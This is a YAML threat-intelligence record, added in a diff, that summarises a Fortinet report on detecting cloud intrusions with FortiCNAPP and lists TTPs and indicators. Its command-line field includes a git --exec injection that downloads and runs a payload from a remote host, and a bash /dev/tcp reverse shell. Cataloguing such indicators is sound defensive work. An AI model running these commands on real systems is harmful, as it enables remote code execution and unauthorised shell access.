@@ -1,0 +1,38 @@
+description: A report detailing the use of FortiCNAPP to detect cloud intrusions by
+  correlating multiple weak indicators into a coherent picture using Composite Alerts
+  and Observation Timelines.
+attribution: Unknown
+TTPs:
+  processes:
+  - git
+  - wget
+  - bash
+  - perl
+  commandline:
+  - /usr/bin/git archive --format=zip --prefix=en --exec=`wget -qO /tmp/QrXErNRt http://10.203.118.5:8080/sYdelk;chmod
+    +x /tmp/QrXErNRt;/tmp/QrXErNRt;rm -f /tmp/QrXErNRt` --remote=bOCNVQ
+  - wget -qO /tmp/QrXErNRt http://10.203.118.5:8080/sYdelk
+  - chmod +x /tmp/QrXErNRt
+  - /tmp/QrXErNRt
+  - rm -f /tmp/QrXErNRt
+  - bash -c 0<&189-;exec 189<>/dev/tcp/10.203.118.5/4444;sh <&189 >&189 2>&189
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - 'Executable: wget, Destination Address: 10.203.118.5, Port: 8080'
+  - 'Executable: wget, Destination Address: 10.203.118.5, Port: 4444'
+  file_activity:
+  - /tmp/QrXErNRt
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+- 'IP Address: 10.203.118.5'
+- 'URL: http://10.203.118.5:8080/sYdelk'
+authors:
+- David Adamson
+reference: https://www.fortinet.com/blog/threat-research/improving-cloud-intrusion-detection-and-triage-with-forticnapp
+date_of_publication: July 17, 2025
+file_creation_date: July 18, 2025
